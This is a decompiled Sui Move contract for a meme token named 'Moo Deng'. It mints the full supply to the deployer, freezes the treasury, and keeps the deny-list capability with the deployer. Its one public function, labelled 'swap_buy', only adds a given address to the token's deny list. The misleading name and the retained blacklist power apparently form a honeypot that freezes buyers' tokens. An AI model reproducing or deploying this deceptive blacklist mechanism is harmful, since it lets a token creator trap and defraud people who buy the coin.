module 0x69e02c1197235b65069824c5936a6922e777e40b50c353b22940b01894b31d6b::moodeng {
    struct MOODENG has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: MOODENG, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<MOODENG>(arg0, 9, b"MOODENG", b"Moo Deng", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/Qmf1g7dJZNDJHRQru7E7ENwDjcvu7swMUB6x9ZqPXr4RV2"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<MOODENG>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<MOODENG>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<MOODENG>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<MOODENG>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MOODENG>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<MOODENG>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

